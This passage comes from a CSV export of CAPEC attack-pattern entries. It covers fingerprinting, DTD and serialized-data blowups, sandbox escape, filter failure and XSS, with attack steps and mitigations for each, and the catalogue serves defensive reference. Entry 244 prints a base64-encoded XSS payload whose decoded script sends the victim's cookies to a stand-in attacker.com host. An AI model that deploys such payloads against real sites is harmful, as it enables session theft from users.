IMPACT:Bypass Protection Mechanism::","::Configuration: Disable iFrames in the Web browser.::Operation: When maintaining an authenticated session with a privileged target system, do not use the same browser to navigate to unfamiliar sites to perform other activities. Finish working with the target system and logout first before proceeding to other tasks.::Operation: If using the Firefox browser, use the NoScript plug-in that will help forbid iFrames.::","::The following example is a real-world iFrame overlay attack [2]. In this attack, the malicious page embeds Twitter.com on a transparent IFRAME. The status-message field is initialized with the URL of the malicious page itself. To provoke the click, which is necessary to publish the entry, the malicious page displays a button labeled Don't Click. This button is aligned with the invisible Update button of Twitter. Once the user performs the click, the status message (i.e., a link to the malicious page itself) is posted to their Twitter profile.::","::1021::","","",
224,"Fingerprinting",Meta,Stable,"An adversary compares output from a target system to known indicators that uniquely identify specific details about the target. Most commonly, fingerprinting is done to determine operating system and application versions. Fingerprinting can be done passively as well as actively. Fingerprinting by itself is not usually detrimental to the target. However, the information gathered through fingerprinting often enables an adversary to discover existing weaknesses in the target.","",High,Very Low,"","","::A means by which to interact with the target system directly.::","::SKILL:Some fingerprinting activity requires very specific knowledge of how different operating systems respond to various TCP/IP requests. Application fingerprinting can be as easy as envoking the application with the correct command line argument, or mouse clicking in the appropriate place on the screen.:LEVEL:Medium::","::If on a network, the adversary needs a tool capable of viewing network communications at the packet level and with header information, like Mitmproxy, Wireshark, or Fiddler.::","","::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::","::While some information is shared by systems automatically based on standards and protocols, remove potentially sensitive information that is not necessary for the application's functionality as much as possible.::","","::200::","TAXONOMY NAME:WASC:ENTRY ID:45:ENTRY NAME:Fingerprinting::","",
226,"Session Credential Falsification through Manipulation",Detailed,Draft,"An attacker manipulates an existing credential in order to gain access to a target application. Session credentials allow users to identify themselves to a service after an initial authentication without needing to resend the authentication information (usually a username and password) with every message. An attacker may be able to manipulate a credential sniffed from an existing connection in order to gain access to a target server.","",,Medium,"::NATURE:ChildOf:CAPEC ID:196::","","::The targeted application must use session credentials to identify legitimate users.::","","::An attacker will need tools to sniff existing credentials (possibly their own) in order to retrieve a base credential for modification. They will need to understand how the components of the credential affect server behavior and how to manipulate this behavior by changing the credential. Finally, they will need tools to allow them to craft and transmit a modified credential.::","","","","","::565::472::","","",
227,"Sustained Client Engagement",Meta,Draft,"An adversary attempts to deny legitimate users access to a resource by continually engaging a specific resource in an attempt to keep the resource tied up as long as possible. The adversary's primary goal is not to crash or flood the target, which would alert defenders; rather it is to repeatedly perform actions or abuse algorithmic flaws such that a given resource is tied up and not available to a legitimate user. By carefully crafting a requests that keep the resource engaged through what is seemingly benign requests, legitimate users are limited or completely denied access to the resource.","",,,"","","::This pattern of attack requires a temporal aspect to the servicing of a given request. Success can be achieved if the adversary can make requests that collectively take more time to complete than legitimate user requests within the same time frame.::","","::To successfully execute this pattern of attack, a script or program is often required that is capable of continually engaging the target and maintaining sustained usage of a specific resource. Depending on the configuration of the target, it may or may not be necessary to involve a network or cluster of objects all capable of making parallel requests.::","","","::Potential mitigations include requiring a unique login for each resource request, constraining local unprivileged access by disallowing simultaneous engagements of the resource, or limiting access to the resource to one access per IP address. In such scenarios, the adversary would have to increase engagements either by launching multiple sessions manually or programmatically to counter such defenses.::","","::400::","TAXONOMY NAME:ATTACK:ENTRY ID:1499:ENTRY NAME:Endpoint Denial of Service::::TAXONOMY NAME:WASC:ENTRY ID:10:ENTRY NAME:Denial of Service::","",
228,"DTD Injection",Detailed,Draft,"An attacker injects malicious content into an application's DTD in an attempt to produce a negative technical impact. DTDs are used to describe how XML documents are processed. Certain malformed DTDs (for example, those with excessive entity expansion as described in CAPEC 197) can cause the XML parsers that process the DTDs to consume excessive resources resulting in resource depletion.","",,Medium,"::NATURE:ChildOf:CAPEC ID:250::NATURE:CanPrecede:CAPEC ID:197::NATURE:CanPrecede:CAPEC ID:491::","::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the target] Using a browser or an automated tool, an attacker records all instances of web services to process XML requests.:TECHNIQUE:Use an automated tool to record all instances of URLs to process XML requests.:TECHNIQUE:Use a browser to manually explore the website and analyze how the application processes XML requests.::STEP:2:PHASE:Explore:DESCRIPTION:[Determine use of XML with DTDs] Examine application input to identify XML input that leverage the use of one or more DTDs.:TECHNIQUE:Examine any available documentation for the application that discusses expected XML input.:TECHNIQUE:Exercise the application using XML input with and without a DTD specified. Failure without DTD likely indicates use of DTD.::STEP:3:PHASE:Exploit:DESCRIPTION:[Craft and inject XML containg malicious DTD payload]:TECHNIQUE:Inject XML expansion attack that creates a Denial of Service impact on the targeted server using its DTD.:TECHNIQUE:Inject XML External Entity (XEE) attack that can cause the disclosure of confidential information, execute abitrary code, create a Denial of Service of the targeted server, or several other malicious impacts.::","::The target must be running an XML based application that leverages DTDs.::","","","","","::Design: Sanitize incoming DTDs to prevent excessive expansion or other actions that could result in impacts like resource depletion.::Implementation: Disallow the inclusion of DTDs as part of incoming messages.::Implementation: Use XML parsing tools that protect against DTD attacks.::","","::829::","","",
229,"Serialized Data Parameter Blowup",Detailed,Draft,"This attack exploits certain serialized data parsers (e.g., XML, YAML, etc.) which manage data in an inefficient manner. The attacker crafts an serialized data file with multiple configuration parameters in the same dataset. In a vulnerable parser, this results in a denial of service condition where CPU resources are exhausted because of the parsing algorithm. The weakness being exploited is tied to parser implementation and not language specific.","",High,High,"::NATURE:ChildOf:CAPEC ID:231::","::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the target] Using a browser or an automated tool, an attacker records all instances of web services to process requests using serialized data.:TECHNIQUE:Use an automated tool to record all instances of URLs to process requests from serialized data.:TECHNIQUE:Use a browser to manually explore the website and analyze how the application processes requests using serialized data.::STEP:2:PHASE:Exploit:DESCRIPTION:[Launch a Blowup attack] The attacker crafts malicious messages that contain multiple configuration parameters in the same dataset.:TECHNIQUE:Send the malicious crafted message containing the multiple configuration parameters to the target URL, causing a denial of service.::","::The server accepts input in the form of serialized data and is using a parser with a runtime longer than O(n) for the insertion of a new configuration parameter in the data container.(examples are .NET framework 1.0 and 1.1)::","","","","","::This attack may be mitigated completely by using a parser that is not using a vulnerable container.::Mitigation may limit the number of configuration parameters per dataset.::","::In this example, assume that the victim is running a vulnerable parser such as .NET framework 1.0. This results in a quadratic runtime of O(n^2). <?xml version=1.0?><fooaaa=ZZZ=...999=/> A document with n attributes results in (n^2)/2 operations to be performed. If an operation takes 100 nanoseconds then a document with 100,000 operations would take 500s to process. In this fashion a small message of less than 1MB causes a denial of service condition on the CPU resources.::A YAML bomb leverages references within a YAML file to create exponential growth in memory requirements. By creating a chain of keys whose values are a list of multiple references to the next key in the chain, the amount of memory and processing required to handle the data grows exponentially. This may lead to denial of service or instability resulting from excessive resource consumption.::","::770::","TAXONOMY NAME:WASC:ENTRY ID:41:ENTRY NAME:XML Attribute Blowup::","",
23,"File Content Injection",Standard,Draft,"An adversary poisons files with a malicious payload (targeting the file systems accessible by the target software), which may be passed through by standard channels such as via email, and standard web content like PDF and multimedia files. The adversary exploits known vulnerabilities or handling routines in the target processes, in order to exploit the host's trust in executing remote content, including binary files.","",High,Very High,"::NATURE:ChildOf:CAPEC ID:242::NATURE:CanAlsoBe:CAPEC ID:165::","","::The target software must consume files.::The adversary must have access to modify files that the target software will consume.::","::SKILL:How to poison a file with malicious payload that will exploit a vulnerability when the file is opened. The adversary must also know how to place the file onto a system where it will be opened by an unsuspecting party, or force the file to be opened.:LEVEL:Medium::","","","::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::","::Design: Enforce principle of least privilege::Design: Validate all input for content including files. Ensure that if files and remote content must be accepted that once accepted, they are placed in a sandbox type location so that lower assurance clients cannot write up to higher assurance processes (like Web server processes for example)::Design: Execute programs with constrained privileges, so parent process does not open up further vulnerabilities. Ensure that all directories, temporary directories and files, and memory are executing with limited privileges to protect against remote execution.::Design: Proxy communication to host, so that communications are terminated at the proxy, sanitizing the requests before forwarding to server host.::Implementation: Virus scanning on host::Implementation: Host integrity monitoring for critical files, directories, and processes. The goal of host integrity monitoring is to be aware when a security issue has occurred so that incident response and other forensic activities can begin.::","::PHP is a very popular language used for developing web applications. When PHP is used with global variables, a vulnerability may be opened that affects the file system. A standard HTML form that allows for remote users to upload files, may also place those files in a public directory where the adversary can directly access and execute them through a browser. This vulnerability allows remote adversaries to execute arbitrary code on the system, and can result in the adversary being able to erase intrusion evidence from system and application logs.::","::20::","","",
230,"Serialized Data with Nested Payloads",Standard,Draft,"Applications often need to transform data in and out of a data format (e.g., XML and YAML) by using a parser. It may be possible for an adversary to inject data that may have an adverse effect on the parser when it is being processed. Many data format languages allow the definition of macro-like structures that can be used to simplify the creation of complex structures. By nesting these structures, causing the data to be repeatedly substituted, an adversary can cause the parser to consume more resources while processing, causing excessive memory consumption and CPU utilization.","::TERM:XML Denial of Service (XML DoS):DESCRIPTION:::",Medium,High,"::NATURE:ChildOf:CAPEC ID:130::","::STEP:1:PHASE:Explore:DESCRIPTION:An adversary determines the input data stream that is being processed by a data parser that supports using substitution on the victim's side.::STEP:2:PHASE:Exploit:DESCRIPTION:An adversary crafts input data that may have an adverse effect on the operation of the parser when the data is parsed on the victim's system.::","::An application's user-controllable data is expressed in a language that supports subsitution.::An application does not perform sufficient validation to ensure that user-controllable data is not malicious.::","","","::Bad data is passed to the data parser (possibly repeatedly), possibly making it crash or execute arbitrary code.::","::SCOPE:Availability:TECHNICAL IMPACT:Resource Consumption::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::","::Carefully validate and sanitize all user-controllable data prior to passing it to the data parser routine. Ensure that the resultant data is safe to pass to the data parser.::Perform validation on canonical data.::Pick a robust implementation of the data parser.::","","::112::20::674::770::","","",
231,"Oversized Serialized Data Payloads",Standard,Draft,"An adversary injects oversized serialized data payloads into a parser during data processing to produce adverse effects upon the parser such as exhausting system resources and arbitrary code execution.","::TERM:XML Denial of Service (XML DoS):DESCRIPTION:::",Medium,High,"::NATURE:ChildOf:CAPEC ID:130::","::STEP:1:PHASE:Explore:DESCRIPTION:An adversary determines the input data stream that is being processed by an serialized data parser on the victim's side.::STEP:2:PHASE:Experiment:DESCRIPTION:An adversary crafts input data that may have an adverse effect on the operation of the data parser when the data is parsed on the victim's system.::","::An application uses an parser for serialized data to perform transformation on user-controllable data.::An application does not perform sufficient validation to ensure that user-controllable data is safe for a data parser.::","::SKILL:Denial of service:LEVEL:Low::SKILL:Arbitrary code execution:LEVEL:High::","","::Bad data is passed to the serialized data parser (possibly repeatedly), possibly making it crash or execute arbitrary code.::","::SCOPE:Availability:TECHNICAL IMPACT:Resource Consumption::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::","::Carefully validate and sanitize all user-controllable serialized data prior to passing it to the parser routine. Ensure that the resultant data is safe to pass to the parser.::Perform validation on canonical data.::Pick a robust implementation of the serialized data parser.::Validate data against a valid schema or DTD prior to parsing.::","","::112::20::674::770::","","TYPE:Other:NOTE:In many cases this type of an attack will result in an XML Denial of Service (XDoS) or similar Denial of Service (DoS) due to an application becoming unstable, freezing, or crashing. However it is possible to cause a crash resulting in arbitrary code execution, leading to a jump from the data plane to the control plane [REF-89].::::TYPE:Other:NOTE:The main weakness in serialized data related DoS is that the service provider generally must inspect, parse, and validate the data messages to determine routing, workflow, security considerations, and so on. It is exactly these inspection, parsing, and validation routines that DoS targets.::",
233,"Privilege Escalation",Meta,Draft,"An adversary exploits a weakness enabling them to elevate their privilege and perform an action that they are not supposed to be authorized to perform.","",,,"","","","","","","","","","::269::1264::1311::","TAXONOMY NAME:ATTACK:ENTRY ID:1548:ENTRY NAME:Abuse Elevation Control Mechanism::","",
234,"Hijacking a privileged process",Standard,Draft,"An adversary gains control of a process that is assigned elevated privileges in order to execute arbitrary code with those privileges. Some processes are assigned elevated privileges on an operating system, usually through association with a particular user, group, or role. If an attacker can hijack this process, they will be able to assume its level of privilege in order to execute their own code.","",,Medium,"::NATURE:ChildOf:CAPEC ID:233::NATURE:CanFollow:CAPEC ID:242::NATURE:CanFollow:CAPEC ID:175::NATURE:CanFollow:CAPEC ID:100::","::STEP:1:PHASE:Explore:DESCRIPTION:[Find process with elevated priveleges] The adversary probes for processes running with elevated privileges.:TECHNIQUE:On Windows, use the process explorer's security tab to see if a process is running with administror privileges.:TECHNIQUE:On Linux, use the ps command to view running processes and pipe the output to a search for a particular user, or the root user.::STEP:2:PHASE:Experiment:DESCRIPTION:[Find vulnerability in running process] The adversary looks for a vulnerability in the running process that would allow for arbitrary code execution with the privilege of the running process.:TECHNIQUE:Look for improper input validation:TECHNIQUE:Look for a buffer overflow which may be exploited if an adversary can inject unvalidated data.:TECHNIQUE:Utilize system utilities that support process control that have been inadequately secured::STEP:3:PHASE:Exploit:DESCRIPTION:[Execute arbitrary code] The adversary exploits the vulnerability that they have found and hijacks the running process.::","::The targeted process or operating system must contain a bug that allows attackers to hijack the targeted process.::","","::None: No specialized resources are required to execute this type of attack.::","","","","","::732::648::","","",
235,"DEPRECATED: Implementing a callback to system routine (old AWT Queue)",Detailed,Deprecated,"This attack pattern has been deprecated. Please refer to CAPEC:30 - Hijacking a Privileged Thread of Execution.","",,,"","","","","","","","","","","","",
236,"DEPRECATED: Catching exception throw/signal from privileged block",Detailed,Deprecated,"This attack pattern has been deprecated as it did not have enough distinction from CAPEC-30 : Hijacking a Privileged Thread of Execution. Please refer to CAPEC-30 moving forward.","",,,"","","","","","","","","","","","",
237,"Escaping a Sandbox by Calling Code in Another Language",Detailed,Draft,"The attacker may submit malicious code of another language to obtain access to privileges that were not intentionally exposed by the sandbox, thus escaping the sandbox. For instance, Java code cannot perform unsafe operations, such as modifying arbitrary memory locations, due to restrictions placed on it by the Byte code Verifier and the JVM. If allowed, Java code can call directly into native C code, which may perform unsafe operations, such as call system calls and modify arbitrary memory locations on their behalf. To provide isolation, Java does not grant untrusted code with unmediated access to native C code. Instead, the sandboxed code is typically allowed to call some subset of the pre-existing native code that is part of standard libraries.","",Low,Very High,"::NATURE:ChildOf:CAPEC ID:480::","::STEP:1:PHASE:Explore:DESCRIPTION:[Probing] The attacker probes the target application to see whether calling code of another language is allowed within a sandbox.:TECHNIQUE:The attacker probes the target application to see whether calling code of another language is allowed within a sandbox.::STEP:2:PHASE:Explore:DESCRIPTION:[Analysis] The attacker analyzes the target application to get a list of cross code weaknesses in the standard libraries of the sandbox.:TECHNIQUE:The attacker analyzes the target application to get a list of cross code weaknesses in the standard libraries of the sandbox.::STEP:3:PHASE:Experiment:DESCRIPTION:[Verify the exploitable security weaknesses] The attacker tries to craft malicious code of another language allowed by the sandbox to verify the security weaknesses of the standard libraries found in the Explore phase.:TECHNIQUE:The attacker tries to explore the security weaknesses by calling malicious code of another language allowed by the sandbox.::STEP:4:PHASE:Exploit:DESCRIPTION:[Exploit the security weaknesses in the standard libraries] The attacker calls malicious code of another language to exploit the security weaknesses in the standard libraries verified in the Experiment phase. The attacker will be able to obtain access to privileges that were not intentionally exposed by the sandbox, thus escaping the sandbox.:TECHNIQUE:The attacker calls malicious code of another language to exploit the security weaknesses in the standard libraries.::","","::SKILL:The attacker must have a good knowledge of the platform specific mechanisms of signing and verifying code. Most code signing and verification schemes are based on use of cryptography, the attacker needs to have an understand of these cryptographic operations in good detail.:LEVEL:High::","::None: No specialized resources are required to execute this type of attack.::","","::SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism::SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-Repudiation:TECHNICAL IMPACT:Gain Privileges::","::Assurance: Sanitize the code of the standard libraries to make sure there is no security weaknesses in them.::Design: Use obfuscation and other techniques to prevent reverse engineering the standard libraries.::Assurance: Use static analysis tool to do code review and dynamic tool to do penetration test on the standard library.::Configuration: Get latest updates for the computer.::","::Exploit: Java/ByteVerify.C is a detection of malicious code that attempts to exploit a vulnerability in the Microsoft Virtual Machine (VM). The VM enables Java programs to run on Windows platforms. The Microsoft Java VM is included in most versions of Windows and Internet Explorer. In some versions of the Microsoft VM, a vulnerability exists because of a flaw in the way the ByteCode Verifier checks code when it is initially being loaded by the Microsoft VM. The ByteCode Verifier is a low level process in the Microsoft VM that is responsible for checking the validity of code - or byte code - as it is initially being loaded into the Microsoft VM. Java/ByteVerify.C attempts to download a file named msits.exe, located in the same virtual directory as the Java applet, into the Windows system folder, and with a random file name. It then tries to execute this specific file. This flaw enables attackers to execute arbitrary code on a user's machine such as writing, downloading and executing additional malware. This vulnerability is addressed by update MS03-011, released in 2003.::","::693::","","",
238,"DEPRECATED: Using URL/codebase / G.A.C. (code source) to convince sandbox of privilege",Detailed,Deprecated,"This attack pattern has been deprecated as it did not appear to be a valid attack pattern.","",,,"","","","","","","","","","","","",
239,"DEPRECATED: Subversion of Authorization Checks: Cache Filtering, Programmatic Security, etc.",Detailed,Deprecated,"This attack pattern has been deprecated as it did not contain any content and did not serve any useful purpose. Please refer to CAPEC-207: removing Important Client Functionality going forward.","",,,"","","","","","","","","","","","",
24,"Filter Failure through Buffer Overflow",Detailed,Draft,"In this attack, the idea is to cause an active filter to fail by causing an oversized transaction. An attacker may try to feed overly long input strings to the program in an attempt to overwhelm the filter (by causing a buffer overflow) and hoping that the filter does not fail securely (i.e. the user input is let into the system unfiltered).","",High,High,"::NATURE:ChildOf:CAPEC ID:100::","::STEP:1:PHASE:Explore:DESCRIPTION:[Survey] The attacker surveys the target application, possibly as a valid and authenticated user:TECHNIQUE:Spidering web sites for inputs that involve potential filtering:TECHNIQUE:Brute force guessing of filtered inputs::STEP:2:PHASE:Experiment:DESCRIPTION:[Attempt injections] Try to feed overly long data to the system. This can be done manually or a dynamic tool (black box) can be used to automate this. An attacker can also use a custom script for that purpose.:TECHNIQUE:Brute force attack through black box penetration test tool.:TECHNIQUE:Fuzzing of communications protocols:TECHNIQUE:Manual testing of possible inputs with attack data.::STEP:3:PHASE:Experiment:DESCRIPTION:[Monitor responses] Watch for any indication of failure occurring. Carefully watch to see what happened when filter failure occurred. Did the data get in?:TECHNIQUE:Boron tagging. Choose clear attack inputs that are easy to notice in output. In binary this is often 0xa5a5a5a5 (alternating 1s and 0s). Another obvious tag value is all zeroes, but it is not always obvious what goes wrong if the null values get into the data.:TECHNIQUE:Check Log files. An attacker with access to log files can look at the outcome of bad input.::STEP:4:PHASE:Exploit:DESCRIPTION:[Abuse the system through filter failure] An attacker writes a script to consistently induce the filter failure.:TECHNIQUE:DoS through filter failure. The attacker causes the system to crash or stay down because of its failure to filter properly.:TECHNIQUE:Malicious code execution. An attacker introduces a malicious payload and executes arbitrary code on the target system.:TECHNIQUE:An attacker can use the filter failure to introduce malicious data into the system and leverage a subsequent SQL injection, Cross Site Scripting, Command Injection or similar weakness if it exists.::","::Ability to control the length of data passed to an active filter.::","::SKILL:An attacker can simply overflow a buffer by inserting a long string into an attacker-modifiable injection vector. The result can be a DoS.:LEVEL:Low::SKILL:Exploiting a buffer overflow to inject malicious code into the stack of a software system or even the heap can require a higher skill level.:LEVEL:High::","","::Many exceptions are thrown by the application's filter modules in a short period of time. Check the logs. See if the probes are coming from the same IP address.::","::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism::SCOPE:Availability:TECHNICAL IMPACT:Unreliable Execution::","::Make sure that ANY failure occurring in the filtering or input validation routine is properly handled and that offending input is NOT allowed to go through. Basically make sure that the vault is closed when failure occurs.::Pre-design: Use a language or compiler that performs automatic bounds checking.::Pre-design through Build: Compiler-based canary mechanisms such as StackGuard, ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking, it is not a complete solution.::Operational: Use OS-level preventative functionality. Not a complete solution.::Design: Use an abstraction library to abstract away risky APIs. Not a complete solution.::","::Sending in arguments that are too long to cause the filter to fail open is one instantiation of the filter failure attack. The Taylor UUCP daemon is designed to remove hostile arguments before they can be executed. If the arguments are too long, however, the daemon fails to remove them. This leaves the door open for attack.::A filter is used by a web application to filter out characters that may allow the input to jump from the data plane to the control plane when data is used in a SQL statement (chaining this attack with the SQL injection attack). Leveraging a buffer overflow the attacker makes the filter fail insecurely and the tainted data is permitted to enter unfiltered into the system, subsequently causing a SQL injection.::Audit Truncation and Filters with Buffer Overflow. Sometimes very large transactions can be used to destroy a log file or cause partial logging failures. In this kind of attack, log processing code might be examining a transaction in real-time processing, but the oversized transaction causes a logic branch or an exception of some kind that is trapped. In other words, the transaction is still executed, but the logging or filtering mechanism still fails. This has two consequences, the first being that you can run transactions that are not logged in any way (or perhaps the log entry is completely corrupted). The second consequence is that you might slip through an active filter that otherwise would stop your attack.::","::120::119::118::74::20::680::733::697::","","",
240,"Resource Injection",Meta,Stable,"An adversary exploits weaknesses in input validation by manipulating resource identifiers enabling the unintended modification or specification of a resource.","",High,High,"","","::The target application allows the user to both specify the identifier used to access a system resource. Through this permission, the user gains the capability to perform actions on that resource (e.g., overwrite the file)::","","","","::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::","::Ensure all input content that is delivered to client is sanitized against an acceptable content specification.::Perform input validation for all content.::Enforce regular patching of software.::","","::99::","TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Resource Injection::","",
241,"DEPRECATED: Code Injection",Meta,Deprecated,"This attack pattern has been deprecated as it is a duplicate of the existing attack pattern CAPEC-242 : Code Injection. Please refer to this other CAPEC going forward.","",,,"","","","","","","","","","","","",
242,"Code Injection",Meta,Stable,"An adversary exploits a weakness in input validation on the target to inject new code into that which is currently executing. This differs from code inclusion in that code inclusion involves the addition or replacement of a reference to a code file, which is subsequently loaded by the target and used as part of the code of some application.","",High,High,"","","::The target software does not validate user-controlled input such that the execution of a process may be altered by sending code in through legitimate data channels, using no other mechanism.::","","","","::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Other:NOTE:Code Injection attack patterns can result in a wide variety of consequences and negatively affect all three elements of the security triad.::","::Utilize strict type, character, and encoding enforcement::Ensure all input content that is delivered to client is sanitized against an acceptable content specification.::Perform input validation for all content.::Enforce regular patching of software.::","","::94::","TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Code Injection::","",
243,"XSS Targeting HTML Attributes",Detailed,Draft,"An adversary inserts commands to perform cross-site scripting (XSS) actions in HTML attributes. Many filters do not adequately sanitize attributes against the presence of potentially dangerous commands even if they adequately sanitize tags. For example, dangerous expressions could be inserted into a style attribute in an anchor tag, resulting in the execution of malicious code when the resulting page is rendered. If a victim is tricked into viewing the rendered page the attack proceeds like a normal XSS attack, possibly resulting in the loss of sensitive cookies or other malicious activities.","",,Medium,"::NATURE:ChildOf:CAPEC ID:591::NATURE:ChildOf:CAPEC ID:592::NATURE:ChildOf:CAPEC ID:588::","::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the application for user-controllable inputs] Using a browser or an automated tool, an adversary follows all public links and actions on a web site. They record all the links, the forms, the resources accessed and all other potential entry-points for the web application.:TECHNIQUE:Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.:TECHNIQUE:Use a proxy tool to record all links visited during a manual traversal of the web application.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.::STEP:2:PHASE:Experiment:DESCRIPTION:[Probe identified potential entry points for XSS targeting HTML attributes] The adversary uses the entry points gathered in the Explore phase as a target list and injects various malicious expressions as input, hoping to embed them as HTML attributes.:TECHNIQUE:Inject single and double quotes into URL parameters or other inputs to see if they are filtered out. Also use URL encoding to bypass filters.:TECHNIQUE:Use single or double quotes to close attribute evaluation and enter a new attribute that contains an expression.::STEP:3:PHASE:Experiment:DESCRIPTION:[Craft malicious XSS URL] Once the adversary has determined which parameters are vulnerable to XSS, they will craft a malicious URL containing the XSS exploit. The adversary can have many goals, from stealing session IDs, cookies, credentials, and page content from the victim.:TECHNIQUE:Execute a script using an expression embedded in an HTML attribute, which avoids needing to inject a script tag.:TECHNIQUE:Send information gathered from the malicious script to a remote endpoint.::STEP:4:PHASE:Exploit:DESCRIPTION:[Get victim to click URL] In order for the attack to be successful, the victim needs to access the malicious URL.:TECHNIQUE:Send a phishing email to the victim containing the malicious URL. This can be hidden in a hyperlink as to not show the full URL, which might draw suspicion.:TECHNIQUE:Put the malicious URL on a public forum, where many victims might accidentally click the link.::","::The target application must fail to adequately sanitize HTML attributes against the presence of dangerous commands.::","","::The adversary must trick the victim into following a crafted link to a vulnerable server or view a web post where the dangerous commands are executed.::","","","::Design: Use libraries and templates that minimize unfiltered input.::Implementation: Normalize, filter and use an allowlist for all input including that which is not expected to have any scripting content.::Implementation: The victim should configure the browser to minimize active content from untrusted sources.::","","::83::","","",
244,"XSS Targeting URI Placeholders",Detailed,Draft,"An attack of this type exploits the ability of most browsers to interpret data, javascript or other URI schemes as client-side executable content placeholders. This attack consists of passing a malicious URI in an anchor tag HREF attribute or any other similar attributes in other HTML tags. Such malicious URI contains, for example, a base64 encoded HTML content with an embedded cross-site scripting payload. The attack is executed when the browser interprets the malicious content i.e., for example, when the victim clicks on the malicious link.","",High,High,"::NATURE:ChildOf:CAPEC ID:591::NATURE:ChildOf:CAPEC ID:592::NATURE:ChildOf:CAPEC ID:588::","::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the application for user-controllable inputs] Using a browser or an automated tool, an adversary follows all public links and actions on a web site. They record all the links, the forms, the resources accessed and all other potential entry-points for the web application.:TECHNIQUE:Use a spidering tool to follow and record all links. Make special note of any links that include parameters in the URL.:TECHNIQUE:Use a proxy tool to record all links visited during a manual traversal of the web application. Make special note of any links that include parameters in the URL. Manual traversal of this type is frequently necessary to identify forms that are GET method forms rather than POST forms.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browser's plugins are available to facilitate the analysis or automate the URL discovery.::STEP:2:PHASE:Experiment:DESCRIPTION:[Probe identified potential entry points for reflected XSS vulnerability] The adversary uses the entry points gathered in the Explore phase as a target list and injects various payloads formatted as data URI schemes using base to determine if an entry point actually represents a vulnerability and to characterize the extent to which the vulnerability can be exploited.:TECHNIQUE:Use a list of XSS probe strings using different URI schemes to inject in parameters of known URLs. If possible, the probe strings contain a unique identifier to trace the injected string back to the entry point.:TECHNIQUE:Use a proxy tool to record results of manual input of XSS probes in known URLs.::STEP:3:PHASE:Experiment:DESCRIPTION:[Craft malicious XSS URL] Once the adversary has determined which parameters are vulnerable to XSS, they will craft a malicious URL containing the XSS exploit. The adversary can have many goals, from stealing session IDs, cookies, credentials, and page content from the victim.:TECHNIQUE:Change a URL parameter to include a malicious payload formatted as a URI scheme, or use the URL returned when the URI scheme was given as input to the web application.:TECHNIQUE:Send information gathered from the malicious script to a remote endpoint.::STEP:4:PHASE:Exploit:DESCRIPTION:[Get victim to click URL] In order for the attack to be successful, the victim needs to access the malicious URL.:TECHNIQUE:Send a phishing email to the victim containing the malicious URL. This can be hidden in a hyperlink as to not show the full URL, which might draw suspicion.:TECHNIQUE:Put the malicious URL on a public forum, where many victims might accidentally click the link.::","::Target client software must allow scripting such as JavaScript and allows executable content delivered using a data URI scheme.::","::SKILL:To inject the malicious payload in a web page:LEVEL:Medium::","::Ability to send HTTP request to a web application::","","::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-Repudiation:TECHNICAL IMPACT:Gain Privileges::SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism::","::Design: Use browser technologies that do not allow client side scripting.::Design: Utilize strict type, character, and encoding enforcement.::Implementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.::Implementation: Ensure all content coming from the client is using the same encoding; if not, the server-side application must canonicalize the data before applying any filtering.::Implementation: Perform input validation for all remote content, including remote and user-generated content::Implementation: Perform output validation for all remote content.::Implementation: Disable scripting languages such as JavaScript in browser::Implementation: Patching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser, web servers, and plug in technologies, staying current on patch release that deal with XSS countermeasures mitigates this.::","::The following payload data: text/html;base64,PGh0bWw+PGJvZHk+PHNjcmlwdD52YXIgaW1nID0gbmV3IEltYWdlKCk7IGltZy5zcmMgPSAiaHR0cDovL2F0dGFja2VyLmNvbS9jb29raWVncmFiYmVyPyIrIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC5jb29raWVzKTs8L3NjcmlwdD48L2JvZHk+PC9odG1sPg== represents a base64 encoded HTML and uses the data URI scheme to deliver it to the browser. The decoded payload is the following piece of HTML code: <html><body><script>var img = new Image();img.src = http://attacker.com/cookiegrabber?+ encodeURIComponent(document.cookies); </script> </body> </html> Web applications that take user controlled inputs and reflect them in URI HTML 